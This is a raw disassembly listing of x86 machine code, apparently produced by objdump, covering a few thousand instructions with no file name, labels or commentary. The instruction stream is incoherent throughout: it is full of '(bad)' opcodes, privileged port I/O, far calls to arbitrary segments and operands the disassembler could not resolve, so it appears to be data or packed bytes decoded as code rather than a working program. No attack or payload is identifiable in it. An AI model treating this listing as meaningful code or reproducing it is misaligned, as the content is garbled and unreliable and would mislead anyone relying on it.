  4146af:	outs   dx,DWORD PTR ds:[esi]
  4146b0:	lahf   
  4146b1:	push   cs
  4146b2:	adc    eax,DWORD PTR [eax]
  4146b4:	les    ebx,FWORD PTR [ecx*2+0x2f9c7d17]
  4146bb:	pop    ebx
  4146bc:	adc    DWORD PTR [ecx],eax
  4146be:	mov    ecx,DWORD PTR [edx+ebp*1]
  4146c1:	add    BYTE PTR [esi+0x79],0xee
  4146c5:	adc    eax,0x74b06846
  4146ca:	push   esi
  4146cb:	out    dx,eax
  4146cc:	pop    es
  4146cd:	adc    edi,ebx
  4146cf:	loope  0x41474a
  4146d1:	sub    BYTE PTR [edi+0x37e0773b],bl
  4146d7:	or     dl,ch
  4146d9:	fidiv  DWORD PTR [edx-0x41]
  4146dc:	idiv   BYTE PTR [ecx]
  4146de:	xor    DWORD PTR [edx],edx
  4146e0:	(bad)  
  4146e1:	test   al,0x13
  4146e3:	cmp    dl,bh
  4146e5:	sub    eax,0x155c6e82
  4146ea:	fist   DWORD PTR [esi-0xc]
  4146ed:	xchg   esp,eax
  4146ee:	push   eax
  4146ef:	mov    dh,ah
  4146f1:	and    cl,BYTE PTR [esi+eiz*1+0xe]
  4146f5:	lds    edi,FWORD PTR [ebx+0x570bd031]
  4146fb:	inc    edx
  4146fc:	push   0xffffff89
  4146fe:	fcomp  QWORD PTR [ecx]
  414700:	ror    DWORD PTR [eax+0x74],1
  414703:	pop    esp
  414704:	xor    al,0xaf
  414706:	adc    ah,dh
  414708:	cmp    DWORD PTR [edx-0x62dd613a],ebp
  41470e:	cdq    
  41470f:	sub    bh,BYTE PTR [ebp+0x76]
  414712:	leave  
  414713:	xor    eax,0xe8899ec9
  414718:	push   ss
  414719:	sbb    eax,0x66f82e03
  41471e:	sbb    BYTE PTR [edx],ch
  414720:	jecxz  0x414717
  414722:	mov    edx,0xd6b9aef8
  414727:	shl    BYTE PTR [edx-0x22],1
  41472a:	push   ebx
  41472b:	mov    ds:0x93b1325d,eax
  414730:	in     eax,dx
  414731:	test   edx,eax
  414733:	jno    0x414720
  414735:	sbb    al,0xb5
  414737:	ins    BYTE PTR es:[edi],dx
  414738:	xor    ebx,DWORD PTR [esi-0x7b]
  41473b:	test   eax,0x37aa4b93
  414740:	outs   dx,DWORD PTR ds:[esi]
  414741:	pop    ds
  414742:	rcr    BYTE PTR [ecx-0x42],cl
  414745:	fisttp WORD PTR [ecx+ebx*8+0x55]
  414749:	shl    eax,0x65
  41474c:	jae    0x414721
  41474e:	sbb    al,0x89
  414750:	fsubrp st(1),st
  414752:	inc    ebx
  414753:	fwait
  414754:	or     DWORD PTR [edx-0x70b459f7],ecx
  41475a:	jno    0x414789
  41475c:	pop    esp
  41475d:	mov    bl,0xb8
  41475f:	add    esp,ebp
  414761:	in     eax,0x97
  414763:	pop    esi
  414764:	loopne 0x414796
  414766:	push   esp
  414767:	inc    BYTE PTR [esi]
  414769:	aam    0x64
  41476b:	and    DWORD PTR [ebx+esi*1-0x71dfde7c],0xffffffdc
  414773:	sar    ebp,cl
  414775:	inc    ebx
  414776:	sub    edx,ebx
  414778:	not    BYTE PTR [ecx+0x20]
  41477b:	repnz shl al,0x30
  41477f:	pop    esp
  414780:	pop    ss
  414781:	daa    
  414782:	cmp    al,0x75
  414784:	nop
  414785:	inc    esi
  414786:	xchg   ebx,eax
  414787:	xchg   DWORD PTR [edi],ebx
  414789:	add    eax,0x1d337f3c
  41478e:	inc    edi
  41478f:	scas   al,BYTE PTR es:[edi]
  414790:	pop    edi
  414791:	adc    DWORD PTR [edx+0x5f],eax
  414794:	sub    dh,ch
  414796:	xchg   ebx,eax
  414797:	popf   
  414798:	xchg   edx,eax
  414799:	adc    BYTE PTR [esi],dh
  41479b:	mov    eax,0xb800c602
  4147a0:	call   0x994f:0x1df012ee
  4147a7:	(bad)  
  4147a8:	add    edx,ebx
  4147aa:	xor    ecx,DWORD PTR [eax+0x2b]
  4147ad:	cmp    al,0xbe
  4147af:	fbld   TBYTE PTR [ebp+0x52]
  4147b2:	add    DWORD PTR [esi+edx*8],edx
  4147b5:	test   al,0xa7
  4147b7:	popf   
  4147b8:	cmp    BYTE PTR [di+0x1009],0xd8
  4147be:	push   eax
  4147bf:	xchg   esp,eax
  4147c0:	cmp    al,0x43
  4147c2:	mov    al,0x3a
  4147c4:	push   esp
  4147c5:	cmp    eax,0xe50c809b
  4147ca:	inc    esi
  4147cb:	popa   
  4147cc:	sub    BYTE PTR [ecx-0x6e87f4b6],0xaa
  4147d3:	mov    dh,0x27
  4147d5:	or     BYTE PTR [ecx+0x731d9c8d],ah
  4147db:	xor    ecx,DWORD PTR [ecx-0x76]
  4147de:	sub    esp,DWORD PTR [eax+0x28]
  4147e1:	jb     0x4147d9
  4147e3:	cmp    BYTE PTR [edi],bh
  4147e5:	cmp    al,0x7c
  4147e7:	xchg   esi,eax
  4147e8:	sub    al,0x8f
  4147ea:	ins    DWORD PTR es:[edi],dx
  4147eb:	xor    dl,dh
  4147ed:	xchg   edx,eax
  4147ee:	sub    esi,ecx
  4147f0:	mov    ah,0xda
  4147f2:	sub    eax,0x41cfcde7
  4147f7:	mov    ds:0x7469e6c4,al
  4147fc:	popf   
  4147fd:	inc    ebp
  4147fe:	mul    BYTE PTR [ebx-0x2033b52]
  414804:	xchg   edi,eax
  414805:	sbb    eax,DWORD PTR [edx]
  414807:	push   ds
  414808:	ror    DWORD PTR [ebx-0x5b],0xbb
  41480c:	mov    esi,0x799b7e1c
  414811:	cmp    bh,0x2f
  414814:	inc    esi
  414815:	repnz or ebp,DWORD PTR [esi]
  414818:	lods   al,BYTE PTR ds:[esi]
  414819:	mov    ch,al
  41481b:	sahf   
  41481c:	xlat   BYTE PTR ds:[ebx]
  41481d:	mov    eax,ds:0x2108a19f
  414822:	(bad)  
  414823:	into   
  414824:	loopne 0x4147e7
  414826:	inc    ecx
  414827:	retf   
  414828:	das    
  414829:	and    DWORD PTR [eax+0x44786f11],ebx
  41482f:	adc    eax,0x7cf26b21
  414834:	push   0xffffffe9
  414836:	es inc ecx
  414838:	les    eax,FWORD PTR [ebx+0x79]
  41483b:	call   0x396c:0x50d01e74
  414842:	pop    esi
  414843:	imul   esi,DWORD PTR [edx-0x4717308b],0xffffffb3
  41484a:	outs   dx,BYTE PTR ds:[esi]
  41484b:	jg     0x4148bb
  41484d:	pop    ebp
  41484e:	xor    esi,esp
  414850:	push   edi
  414851:	xchg   ah,bl
  414853:	xlat   BYTE PTR ds:[ebx]
  414854:	inc    edx
  414855:	hlt    
  414856:	jp     0x414843
  414858:	outs   dx,BYTE PTR ds:[esi]
  414859:	ret    
  41485a:	xchg   ecx,eax
  41485b:	push   ds
  41485c:	push   edi
  41485d:	mov    ecx,0xb8039010
  414862:	daa    
  414863:	adc    BYTE PTR [esi],dl
  414865:	mov    ?,WORD PTR [esi]
  414867:	test   al,0x34
  414869:	inc    edi
  41486a:	push   edx
  41486b:	mov    edx,0x2e5516f
  414870:	in     al,0xab
  414872:	jecxz  0x4148c5
  414874:	nop
  414875:	push   cs
  414876:	dec    esi
  414877:	cli    
  414878:	jae    0x41488c
  41487a:	out    0xd3,eax
  41487c:	add    esi,DWORD PTR [ecx+eiz*2-0x6cba1a0d]
  414883:	aam    0x6d
  414885:	or     DWORD PTR [eax-0x2ab55264],esp
  41488b:	adc    al,0x4f
  41488d:	and    ebx,DWORD PTR [edx+0x2cec835]
  414893:	stc    
  414894:	mov    bl,0x12
  414896:	mov    edx,0x9c237339
  41489b:	mov    ah,dh
  41489d:	jo     0x414821
  41489f:	add    eax,0xcb41c459
  4148a4:	sti    
  4148a5:	adc    al,BYTE PTR [ebx+ebp*8+0x4812a2d7]
  4148ac:	daa    
  4148ad:	outs   dx,BYTE PTR ds:[esi]
  4148ae:	in     eax,dx
  4148af:	jle    0x4148a8
  4148b1:	fs pop esi
  4148b3:	jg     0x414913
  4148b5:	pop    esp
  4148b6:	pop    ds
  4148b7:	(bad)  
  4148b8:	cwde   
  4148b9:	push   cs
  4148ba:	gs pusha 
  4148bc:	mov    esi,0x485dbeca
  4148c1:	jecxz  0x414875
  4148c3:	addr16 out dx,eax
  4148c5:	jo     0x414946
  4148c7:	dec    eax
  4148c8:	ds cmp cl,al
  4148cb:	std    
  4148cc:	rcr    BYTE PTR [ecx+0xf],cl
  4148cf:	in     al,dx
  4148d0:	mov    esp,0xb95c3f2b
  4148d5:	outs   dx,BYTE PTR ds:[esi]
  4148d6:	jle    0x4148c8
  4148d8:	push   ss
  4148d9:	jno    0x414920
  4148db:	mov    ebp,0x5e2c1000
  4148e0:	icebp  
  4148e1:	ja     0x414924
  4148e3:	add    al,0xd3
  4148e5:	ffreep st(0)
  4148e7:	std    
  4148e8:	or     ecx,DWORD PTR [edi]
  4148ea:	mov    ah,0x27
  4148ec:	sub    eax,0xda612267
  4148f1:	daa    
  4148f2:	out    0xd,eax
  4148f4:	addr16 pop edx
  4148f6:	nop
  4148f7:	lea    ebp,[edi+0x16]
  4148fa:	push   ss
  4148fb:	lahf   
  4148fc:	jnp    0x41488a
  4148fe:	jg     0x4148dc
  414900:	jne    0x414940
  414902:	(bad)  
  414903:	push   eax
  414904:	imul   ecx,ebp,0x8ac07177
  41490a:	mov    ds:0x7e8ef8c1,al
  41490f:	cmp    al,0x94
  414911:	add    eax,0x5bd52b9e
  414916:	sub    dh,BYTE PTR [edx]
  414918:	int3   
  414919:	(bad)  [ebx-0x536b94ad]
  41491f:	or     ah,cl
  414921:	shl    DWORD PTR [esp+edx*2],cl
  414924:	aaa    
  414925:	cmc    
  414926:	int    0x65
  414928:	dec    ebx
  414929:	mov    esp,DWORD PTR [edi]
  41492b:	ret    0x57e9
  41492e:	int    0x90
  414930:	sti    
  414931:	sub    eax,DWORD PTR [ebx+0x72]
  414934:	dec    esi
  414935:	out    0x6b,eax
  414937:	fbstp  TBYTE PTR [eax-0x3a8012d8]
  41493d:	lods   eax,DWORD PTR ds:[esi]
  41493f:	or     al,0x83
  414941:	test   al,0x6a
  414943:	shl    DWORD PTR [ebx+ebx*8+0x21],cl
  414947:	rol    bh,0xcb
  41494a:	push   edx
  41494b:	push   ss
  41494c:	inc    ecx
  41494d:	xchg   ebx,eax
  41494e:	iret   
  41494f:	xchg   BYTE PTR [esi-0x534dc0a4],al
  414955:	sbb    ebp,DWORD PTR [ecx+0x35a6c465]
  41495b:	je     0x4148f9
  41495d:	cmc    
  41495e:	or     DWORD PTR [esi+ebx*8+0x476afef7],ebp
  414965:	(bad)  
  414967:	push   ss
  414968:	sub    BYTE PTR [edi],cl
  41496a:	or     ebx,eax
  41496c:	sahf   
  41496d:	and    eax,0x16789929
  414972:	lods   al,BYTE PTR ds:[esi]
  414973:	test   eax,0x3939f928
  414978:	sub    eax,0x2e9f2f9b
  41497d:	repz loop 0x4149b6
  414980:	ins    DWORD PTR es:[edi],dx
  414981:	test   DWORD PTR ds:0x7a8adf83,eax
  414987:	adc    al,BYTE PTR [esi+0x6f]
  41498a:	push   0x4b27dfda
  41498f:	test   al,0xc7
  414991:	and    DWORD PTR [ecx],eax
  414993:	mov    ch,0x63
  414995:	cmp    esi,eax
  414997:	pop    DWORD PTR gs:[ebx]
  41499a:	jecxz  0x4149d4
  41499c:	and    esp,ecx
  41499e:	daa    
  41499f:	ins    DWORD PTR es:[edi],dx
  4149a0:	js     0x414962
  4149a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149a3:	div    BYTE PTR [ebp+0x7c]
  4149a6:	inc    DWORD PTR [ecx]
  4149a8:	stc    
  4149a9:	jo     0x4149b8
  4149ab:	pop    edx
  4149ac:	mov    cl,BYTE PTR [esi]
  4149ae:	jae    0x414a1b
  4149b0:	mov    bh,BYTE PTR [esi-0x4a]
  4149b3:	fsubrp st(6),st
  4149b5:	mov    BYTE PTR [esi],dl
  4149b7:	pop    ebx
  4149b8:	mov    dh,0x62
  4149ba:	fadd   QWORD PTR ds:0x7944917a
  4149c0:	jb     0x4149fa
  4149c2:	scas   eax,DWORD PTR es:[edi]
  4149c3:	sub    eax,0x2e158e4
  4149c8:	or     al,0x19
  4149ca:	dec    ebp
  4149cb:	fimul  WORD PTR [esi]
  4149cd:	adc    al,0x42
  4149cf:	bound  edi,QWORD PTR [ebx+0x39e85287]
  4149d5:	dec    ebp
  4149d6:	mov    dh,0xad
  4149d8:	out    dx,al
  4149d9:	inc    edx
  4149da:	outs   dx,DWORD PTR ds:[esi]
  4149db:	repnz and bl,dl
  4149de:	push   ds
  4149df:	xchg   ecx,eax
  4149e0:	or     al,0xb1
  4149e2:	outs   dx,BYTE PTR ds:[esi]
  4149e3:	leave  
  4149e4:	test   DWORD PTR [edx],edi
  4149e6:	arpl   WORD PTR [ecx+0x3651fe20],ax
  4149ec:	adc    al,0x70
  4149ee:	fstp   QWORD PTR [edi+0x7c]
  4149f1:	pop    ecx
  4149f2:	push   es
  4149f3:	js     0x4149d3
  4149f5:	xchg   ebp,eax
  4149f6:	outs   dx,BYTE PTR ss:[esi]
  4149f8:	and    DWORD PTR [ebp-0x23],eax
  4149fb:	outs   dx,BYTE PTR ds:[esi]
  4149fd:	in     al,dx
  4149fe:	retf   
  4149ff:	mov    ebx,0x71da0d8e
  414a04:	pop    eax
  414a05:	les    edx,FWORD PTR [edx-0x10]
  414a08:	ins    DWORD PTR es:[edi],dx
  414a09:	pop    edx
  414a0a:	es jne 0x414a6c
  414a0d:	fs cmp dl,0xa0
  414a11:	in     al,dx
  414a12:	push   esp
  414a13:	into   
  414a14:	push   DWORD PTR [esp+ebp*2]
  414a17:	test   al,0xb3
  414a19:	inc    esi
  414a1a:	nop
  414a1b:	lods   al,BYTE PTR ds:[esi]
  414a1c:	or     ecx,DWORD PTR [ebx+ebx*2]
  414a1f:	cmp    dh,BYTE PTR [esi]
  414a21:	ss pop ebx
  414a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a24:	jmp    0x6085:0xb49f8973
  414a2b:	ret    0xe5b7
  414a2e:	mov    ?,ebp
  414a30:	dec    ebx
  414a31:	add    DWORD PTR [edi],ecx
  414a33:	js     0x414a3f
  414a35:	jge    0x414ab1
  414a37:	sub    esp,ebx
  414a39:	inc    edi
  414a3a:	lea    esi,[edi+edi*1+0x1afe7faf]
  414a41:	data16 xchg dh,cl
  414a44:	int3   
  414a45:	and    BYTE PTR [edi+0x56],dl
  414a48:	pop    esi
  414a49:	push   0x636949f7
  414a4e:	xor    eax,0xe8fd36c9
  414a53:	pop    esi
  414a54:	outs   dx,DWORD PTR ds:[esi]
  414a55:	jne    0x414a51
  414a57:	das    
  414a58:	xor    BYTE PTR [ebx],0x47
  414a5b:	aad    0x49
  414a5d:	lods   eax,DWORD PTR ds:[esi]
  414a5e:	pop    edx
  414a5f:	push   cs
  414a60:	test   eax,0xa119f3f9
  414a65:	jnp    0x414a6f
  414a67:	lods   al,BYTE PTR ds:[esi]
  414a68:	outs   dx,DWORD PTR ds:[esi]
  414a69:	cli    
  414a6a:	xchg   ebx,eax
  414a6b:	minps  xmm1,XMMWORD PTR [eax+0x70]
  414a6f:	dec    BYTE PTR [edi+0x49]
  414a72:	push   cs
  414a73:	mov    edx,0x9f6f150c
  414a78:	mov    esp,0x394759a2
  414a7d:	and    al,0xbc
  414a7f:	nop
  414a80:	int    0xaf
  414a82:	out    0xa5,al
  414a84:	push   esi
  414a85:	ficom  DWORD PTR [esi+0x76e64737]
  414a8b:	into   
  414a8c:	scas   al,BYTE PTR es:[edi]
  414a8d:	xchg   ebx,eax
  414a8e:	jb     0x414a2c
  414a90:	mov    bh,BYTE PTR [esi+0x69]
  414a93:	test   BYTE PTR [eax-0x314c606d],bl
  414a99:	mov    ch,0x6
  414a9b:	cwde   
  414a9c:	push   0x91588c42
  414aa1:	adc    DWORD PTR [ebx-0x15],esp
  414aa4:	scas   al,BYTE PTR es:[edi]
  414aa5:	xchg   ebp,eax
  414aa6:	xchg   BYTE PTR [edx+edi*2-0x71],ah
  414aaa:	mov    dl,0x69
  414aac:	into   
  414aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aae:	cmp    al,0x58
  414ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab1:	push   ss
  414ab2:	call   0x33d3:0x53c2e942
  414ab9:	and    al,0xb6
  414abb:	aad    0x4
  414abd:	loope  0x414a9f
  414abf:	test   al,0x2d
  414ac1:	add    eax,0x60e51377
  414ac6:	cmp    ecx,DWORD PTR [edi-0x48f17d72]
  414acc:	xchg   ebp,eax
  414acd:	sti    
  414ace:	and    eax,0xfe849bd1
  414ad3:	stos   BYTE PTR es:[edi],al
  414ad4:	jae    0x414b06
  414ad6:	or     esp,DWORD PTR [eax]
  414ad8:	xor    esi,DWORD PTR [esi+edx*8-0x56]
  414adc:	imul   DWORD PTR es:[eax]
  414adf:	push   eax
  414ae0:	xor    ch,BYTE PTR [edi]
  414ae2:	mov    gs,WORD PTR [edx]
  414ae4:	or     eax,0x569f0496
  414ae9:	(bad)  
  414aeb:	and    ebp,DWORD PTR [ecx]
  414aed:	je     0x414ab4
  414aef:	loop   0x414ae7
  414af1:	cmp    DWORD PTR [edx-0x37613a56],esp
  414af7:	inc    esp
  414af8:	push   ss
  414af9:	shr    DWORD PTR ds:0xd2ac917f,0x2b
  414b00:	arpl   WORD PTR [esi],bp
  414b02:	and    al,0xef
  414b04:	loop   0x414b60
  414b06:	popa   
  414b07:	jecxz  0x414ad3
  414b09:	push   ss
  414b0a:	pop    esi
  414b0b:	jmp    0x51a9d5e2
  414b10:	fldenv [edx]
  414b12:	ret    0xee82
  414b15:	xchg   ecx,eax
  414b16:	inc    edi
  414b17:	rcl    BYTE PTR [edx+0x21fefe2b],cl
  414b1d:	(bad)  
  414b1e:	lahf   
  414b1f:	mov    ebp,0x87d7677
  414b25:	call   0x931d:0x6401d328
  414b2c:	sysenter 
  414b2e:	mov    bh,0x82
  414b30:	mov    WORD PTR [ecx-0xd24bb90],gs
  414b36:	call   0x312cf72
  414b3b:	cdq    
  414b3c:	dec    ebx
  414b3d:	outs   dx,BYTE PTR ds:[esi]
  414b3e:	in     eax,0xf0
  414b40:	mov    edi,0xba6d9ffa
  414b45:	sbb    esp,ebx
  414b47:	jg     0x414ad3
  414b49:	fsubp  st(7),st
  414b4b:	inc    esi
  414b4c:	mov    cl,0x1d
  414b4e:	test   ecx,eax
  414b50:	jb     0xa25c3dde
  414b56:	outs   dx,DWORD PTR ds:[esi]
  414b57:	(bad)  
  414b58:	out    0xa9,al
  414b5a:	daa    
  414b5b:	mov    eax,DWORD PTR [edx]
  414b5d:	leave  
  414b5e:	mov    cl,0x94
  414b60:	add    BYTE PTR [eax+0x5e],bl
  414b63:	sbb    dl,bh
  414b65:	int3   
  414b66:	test   BYTE PTR [esi],al
  414b68:	pop    esi
  414b69:	adc    ah,BYTE PTR [esi-0x12]
  414b6c:	xlat   BYTE PTR ds:[ebx]
  414b6d:	cmp    ecx,ecx
  414b6f:	jl     0x414bd6
  414b71:	jae    0x414b7e
  414b73:	mov    eax,DWORD PTR ds:0x88e667d7
  414b79:	add    ebp,DWORD PTR [ecx-0x13fdc721]
  414b7f:	sbb    ebx,0x6c
  414b82:	rol    BYTE PTR es:[eax],0x2c
  414b86:	iret   
  414b87:	adc    cl,BYTE PTR [eax+0x2426e3c0]
  414b8d:	ror    ch,cl
  414b8f:	aad    0xbe
  414b91:	imul   bl
  414b93:	stos   BYTE PTR es:[edi],al
  414b94:	and    ebx,eax
  414b96:	aaa    
  414b97:	add    al,0x40
  414b99:	or     al,bh
  414b9b:	add    DWORD PTR [esi+0x7a],esi
  414b9e:	inc    eax
  414b9f:	addr16 mov dh,0x7e
  414ba2:	(bad)  
  414ba3:	call   FWORD PTR [ecx-0x79bcb115]
  414ba9:	push   es
  414baa:	rol    DWORD PTR [ecx+0x1d6e0862],0xe5
  414bb1:	les    eax,FWORD PTR [edi]
  414bb3:	dec    edi
  414bb4:	into   
  414bb5:	rcl    al,cl
  414bb7:	cld    
  414bb8:	adc    eax,0xd33ca7fe
  414bbd:	out    0x46,al
  414bbf:	(bad)  
  414bc0:	(bad)  
  414bc1:	pop    ebp
  414bc2:	xor    esp,ebx
  414bc4:	mov    edi,0x3adbd5d
  414bc9:	out    0x5,al
  414bcb:	push   ebp
  414bcc:	imul   eax,DWORD PTR [eax],0x7f
  414bcf:	push   esi
  414bd0:	sbb    eax,0xfa03fcdf
  414bd5:	jnp    0x414c28
  414bd7:	jnp    0x414b61
  414bd9:	std    
  414bda:	imul   ebp,DWORD PTR [ebx-0x41],0xffffffa6
  414bde:	rol    BYTE PTR [edi+0x38a75501],1
  414be4:	ret    0xf41b
  414be7:	and    ebx,DWORD PTR [edi+0x45]
  414bea:	stos   BYTE PTR es:[edi],al
  414beb:	sbb    al,0x22
  414bed:	fadd   st(3),st
  414bef:	idiv   BYTE PTR [ebp-0x75]
  414bf2:	push   0x60
  414bf4:	bound  ecx,QWORD PTR [edi+0x34]
  414bf7:	je     0x414b84
  414bf9:	mov    eax,ds:0x724b94bc
  414bfe:	fcom   QWORD PTR [ecx+0x72]
  414c01:	addr16 adc eax,0x6edbb758
  414c07:	test   BYTE PTR [eax+0x25],ah
  414c0a:	cmp    bh,BYTE PTR [edi]
  414c0c:	out    dx,al
  414c0d:	xor    DWORD PTR [esi+eax*4+0x65df98f7],0x318e7441
  414c18:	push   cs
  414c19:	pop    edx
  414c1a:	aad    0x2a
  414c1c:	popf   
  414c1d:	sub    ebp,DWORD PTR [ebx+0x72a8870b]
  414c23:	xlat   BYTE PTR ds:[ebx]
  414c24:	xchg   bh,al
  414c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c27:	jge    0x414bd7
  414c29:	pushf  
  414c2a:	popf   
  414c2b:	push   esp
  414c2c:	mov    dl,0x8c
  414c2e:	lock jo 0x414c45
  414c31:	jecxz  0x414caf
  414c33:	ret    
  414c34:	les    esi,FWORD PTR [eax]
  414c36:	stc    
  414c37:	loop   0x414bf9
  414c39:	sub    DWORD PTR [esi+0x79],eax
  414c3c:	retf   0x3925
  414c3f:	out    dx,al
  414c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c41:	mov    ebx,0x5a32e520
  414c46:	mov    edx,0x2c3c9e2d
  414c4b:	shr    ebp,0x6c
  414c4e:	push   edi
  414c4f:	jnp    0x414bf5
  414c51:	push   cs
  414c52:	(bad)  
  414c53:	fcomp  QWORD PTR [esi]
  414c55:	and    DWORD PTR [edx-0xb],esi
  414c58:	jb     0x414c58
  414c5a:	xor    al,0x87
  414c5c:	xor    eax,0x7afdd215
  414c61:	out    dx,eax
  414c62:	add    ecx,DWORD PTR [ecx-0x4b]
  414c65:	pop    eax
  414c66:	mov    ds:0x24c48168,al
  414c6b:	or     esp,ebp
  414c6d:	push   ebp
  414c6e:	dec    edx
  414c6f:	outs   dx,BYTE PTR ds:[esi]
  414c70:	int3   
  414c71:	xchg   ecx,eax
  414c72:	xchg   BYTE PTR [eax],al
  414c74:	push   ecx
  414c75:	cmp    eax,0x8b1f6205
  414c7a:	aad    0x73
  414c7c:	xchg   edx,eax
  414c7d:	(bad)  
  414c7e:	or     DWORD PTR [eax+0x5c37bff3],edi
  414c84:	test   eax,0xfb640e6d
  414c89:	enter  0x51d8,0xa2
  414c8d:	aam    0xe1
  414c8f:	jne    0x414cd6
  414c91:	push   esp
  414c92:	aaa    
  414c93:	rcl    BYTE PTR [edx+eiz*8],cl
  414c96:	(bad)  
  414c97:	cmp    DWORD PTR [ebx],ebx
  414c99:	inc    ecx
  414c9a:	jle    0x414cb8
  414c9c:	stos   BYTE PTR es:[edi],al
  414c9d:	jmp    0x5cda8b71
  414ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca3:	and    al,0x74
  414ca5:	and    BYTE PTR [edx+ebp*1],bh
  414ca8:	imul   eax,DWORD PTR [esi+0xfdce20c],0xffffffe1
  414caf:	xlat   BYTE PTR ds:[ebx]
  414cb0:	cwde   
  414cb1:	jecxz  0x414c8d
  414cb3:	mov    al,0x63
  414cb5:	xchg   BYTE PTR [esp+edi*2-0x3e5f776c],ch
  414cbc:	xchg   ecx,eax
  414cbd:	into   
  414cbe:	in     al,0xd4
  414cc0:	push   edx
  414cc1:	shl    DWORD PTR [ecx],cl
  414cc3:	popf   
  414cc4:	adc    bl,cl
  414cc6:	shl    DWORD PTR [esi-0x236bcd73],1
  414ccc:	out    0x9c,al
  414cce:	retf   0xf2e
  414cd1:	push   0xffffffa7
  414cd3:	mov    ebx,0xca966b54
  414cd8:	cli    
  414cd9:	pop    es
  414cda:	xor    dl,BYTE PTR [edi]
  414cdc:	ret    
  414cdd:	outs   dx,DWORD PTR ds:[esi]
  414cde:	mov    esi,0x434d4e12
  414ce3:	jns    0x414d3a
  414ce5:	xchg   dl,ch
  414ce7:	add    DWORD PTR [ecx+0x255d8608],edx
  414ced:	nop
  414cee:	jl     0x414d05
  414cf0:	(bad)  
  414cf2:	cmp    ah,BYTE PTR [edi]
  414cf4:	pop    ebp
  414cf5:	scas   eax,DWORD PTR es:[edi]
  414cf6:	pop    ds
  414cf7:	scas   al,BYTE PTR es:[edi]
  414cf8:	or     al,cl
  414cfa:	jmp    0x884e56a9
  414cff:	fnsave [edi-0x25]
  414d02:	mov    bh,ah
  414d04:	dec    eax
  414d05:	dec    ebp
  414d06:	sub    dh,BYTE PTR [ebp-0x47]
  414d09:	or     ah,BYTE PTR [ebp+ebx*8-0x65]
  414d0d:	sub    DWORD PTR [ebx],ebx
  414d0f:	mov    esp,esi
  414d11:	pop    ss
  414d12:	out    0x4a,eax
  414d14:	ins    DWORD PTR es:[edi],dx
  414d15:	add    eax,0xef67bccb
  414d1a:	nop
  414d1b:	jae    0x414d07
  414d1d:	clc    
  414d1e:	mov    bh,0x44
  414d20:	sub    eax,0x6c7d5738
  414d25:	clc    
  414d26:	and    bl,0xd7
  414d29:	add    DWORD PTR [edi*4+0x2ccf8ba1],0x2107910d
  414d34:	xchg   dl,ah
  414d36:	cld    
  414d37:	fidiv  DWORD PTR [eax-0x2832d6d8]
  414d3d:	repnz sbb al,0x4
  414d40:	or     edx,DWORD PTR [ecx]
  414d42:	dec    esp
  414d43:	ins    BYTE PTR es:[edi],dx
  414d44:	das    
  414d45:	push   ecx
  414d46:	scas   al,BYTE PTR es:[edi]
  414d47:	inc    esi
  414d48:	pop    ebx
  414d49:	cmp    BYTE PTR [ebx+0x74],bh
  414d4c:	or     BYTE PTR [ecx],0x12
  414d4f:	fdivr  QWORD PTR [esi]
  414d51:	into   
  414d52:	add    BYTE PTR [ebp-0x62],ch
  414d55:	inc    ebx
  414d56:	and    eax,0x4ca7447c
  414d5b:	dec    esi
  414d5c:	xor    cl,dh
  414d5e:	and    eax,0x99556550
  414d63:	mov    eax,0x533bd485
  414d68:	fld    QWORD PTR [esp+ecx*8+0x64088fbf]
  414d6f:	test   BYTE PTR [ebx+edx*4+0x81662d5],bl
  414d76:	mov    ebp,?
  414d78:	adc    al,0x53
  414d7a:	push   0x79ab47de
  414d7f:	push   edx
  414d80:	bts    ecx,ecx
  414d83:	dec    edx
  414d84:	fild   WORD PTR [edi+eiz*8-0x42d30c1c]
  414d8b:	push   eax
  414d8c:	xchg   DWORD PTR [ebx+0x11],ebx
  414d8f:	xchg   edx,eax
  414d90:	sbb    DWORD PTR [ebx],ebp
  414d92:	jo     0x414e00
  414d94:	sbb    al,0xe0
  414d96:	add    BYTE PTR [ebx+0x66],bh
  414d99:	call   0xeca2:0x4bf7f135
  414da0:	inc    ebx
  414da1:	ins    BYTE PTR es:[edi],dx
  414da2:	call   FWORD PTR [ebx-0x60]
  414da5:	hlt    
  414da6:	xchg   esp,eax
  414da7:	adc    eax,ebx
  414da9:	pusha  
  414daa:	xchg   esi,eax
  414dab:	jne    0x414daa
  414dad:	shl    DWORD PTR [ecx],cl
  414daf:	dec    esp
  414db0:	xor    ebx,esp
  414db2:	fistp  WORD PTR [eax+0x55787e78]
  414db8:	mov    al,BYTE PTR [ecx+0x2796a515]
  414dbe:	dec    DWORD PTR [edx+0x17]
  414dc1:	xchg   DWORD PTR [ebp-0x1c],ebp
  414dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc5:	xlat   BYTE PTR es:[ebx]
  414dc7:	push   0x7f
  414dc9:	dec    esp
  414dca:	pop    ds
  414dcb:	cwde   
  414dcc:	xchg   ebx,eax
  414dcd:	test   ecx,0x55180d1b
  414dd3:	mov    al,ds:0xf2000200
  414dd8:	addr16 inc ebx
  414dda:	adc    DWORD PTR [eax+ecx*1+0x42601fa],ebx
  414de1:	dec    esi
  414de2:	mov    dl,0xdd
  414de4:	jmp    0x414dfd
  414de6:	lea    edx,[ecx]
  414de8:	xchg   BYTE PTR [eax],ch
  414dea:	inc    esp
  414deb:	call   0x90b2:0x2f23c77b
  414df2:	adc    al,0xb2
  414df4:	psrld  mm6,QWORD PTR [edi*1-0x2cbb9986]
  414dfc:	fdiv   DWORD PTR [eax+0x558d59a6]
  414e02:	and    bl,BYTE PTR [ecx]
  414e04:	inc    ecx
  414e05:	xchg   DWORD PTR [ebx+0x4c1c8f45],esp
  414e0b:	xor    al,0x86
  414e0d:	shr    ebx,0x79
  414e10:	clc    
  414e11:	retf   0x7d5f
  414e14:	aad    0xe9
  414e16:	and    dl,ch
  414e18:	les    ebp,FWORD PTR [esi]
  414e1a:	test   dh,0x49
  414e1d:	push   ebx
  414e1e:	xchg   ebp,eax
  414e1f:	retf   0xcf9f
  414e22:	(bad)  
  414e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e24:	push   edx
  414e25:	(bad)  
